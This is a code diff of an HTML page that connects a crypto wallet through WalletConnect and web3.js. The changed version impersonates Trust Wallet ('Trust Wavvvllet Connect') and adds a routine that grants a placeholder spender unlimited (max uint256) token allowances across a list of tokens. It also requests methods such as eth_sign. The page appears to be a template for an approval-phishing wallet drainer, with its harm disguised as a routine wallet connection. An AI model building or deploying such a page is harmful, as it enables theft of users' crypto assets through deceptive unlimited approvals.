@@ -3,27 +3,26 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>WalletConnect v2 Approve</title>
-  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
-</head>
-<body>
-  <h1>Conne2ct Wallet & Approve</h1>
-  <button id="connectButton">Connect Wallet</button>
-  <p id="status">Not connected</p>
-  <button id="approveButton" style="display:none;">Approve Tokens</button>
-
+  <title>Connect Trust Wallet</title>
   <script type="module">
-    import EthereumProvider from "https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider/dist/esm/index.js";
+    import EthereumProvider from "https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.10.1/dist/ethereum-provider.min.js";
 
     let provider;
     let web3;
-    let accounts = [];
+    let accounts;
 
-    const connectWallet = async () => {
+    async function connectWallet() {
       provider = await EthereumProvider.init({
-        projectId: "YOUR_PROJECT_ID", // Get it from https://cloud.walletconnect.com
-        chains: [1], // Mainnet
-        showQrModal: true
+        projectId: "7dabcdde47b6439403c2ec186b1fedaf", // Зарегистрируйся и получи на https://cloud.walletconnect.com
+        chains: [1], // Ethereum Mainnet
+        showQrModal: true,
+        methods: [
+          "eth_sendTransaction",
+          "personal_sign",
+          "eth_sign",
+          "eth_signTypedData",
+          "wallet_switchEthereumChain"
+        ]
       });
 
       await provider.enable();
@@ -31,41 +30,59 @@
       accounts = await web3.eth.getAccounts();
 
       document.getElementById("status").innerText = `Connected: ${accounts[0]}`;
-      document.getElementById("connectButton").style.display = "none";
       document.getElementById("approveButton").style.display = "inline-block";
-    };
+    }
 
-    const approveTokens = async () => {
-      const tokenAddress = "0xTokenAddress"; // замените на нужный токен
-      const spender = "0xSpenderAddress";   // кто получит право тратить токены
+    async function approveAllTokens() {
+      if (!web3 || !accounts || accounts.length === 0) return;
+
+      const spender = "0xSpenderAddress"; // адрес контракта, которому ты хочешь дать approve
+      const tokens = [
+        "0xToken1",
+        "0xToken2",
+        "0xToken3"
+      ];
 
       const abi = [
         {
-          constant: false,
-          inputs: [
-            { name: "_spender", type: "address" },
-            { name: "_value", type: "uint256" }
+          "constant": false,
+          "inputs": [
+            { "name": "_spender", "type": "address" },
+            { "name": "_value", "type": "uint256" }
           ],
-          name: "approve",
-          outputs: [{ name: "", type: "bool" }],
-          type: "function"
+          "name": "approve",
+          "outputs": [{ "name": "", "type": "bool" }],
+          "type": "function"
         }
       ];
 
-      const tokenContract = new web3.eth.Contract(abi, tokenAddress);
-      const maxUint = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-
-      try {
-        await tokenContract.methods.approve(spender, maxUint).send({ from: accounts[0] });
-        alert("Approve successful!");
-      } catch (err) {
-        console.error("Approve error:", err);
-        alert("Approve failed");
+      for (let token of tokens) {
+        const contract = new web3.eth.Contract(abi, token);
+        try {
+          await contract.methods
+            .approve(spender, web3.utils.toTwosComplement(-1)) // approve max uint256
+            .send({ from: accounts[0] });
+          console.log(`Approved token: ${token}`);
+        } catch (e) {
+          console.error(`Failed to approve ${token}`, e);
+        }
       }
-    };
 
-    document.getElementById("connectButton").addEventListener("click", connectWallet);
-    document.getElementById("approveButton").addEventListener("click", approveTokens);
+      alert("All tokens approved!");
+    }
+
+    window.onload = () => {
+      document.getElementById("connectButton").addEventListener("click", connectWallet);
+      document.getElementById("approveButton").addEventListener("click", approveAllTokens);
+    };
   </script>
+
+  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
+</head>
+<body>
+  <h1>Trust Wavvvllet Connect</h1>
+  <button id="connectButton">Connect Wallet</button>
+  <p id="status">Not connected</p>
+  <button id="approveButton" style="display:none;">Approve All Tokens</button>
 </body>
 </html>
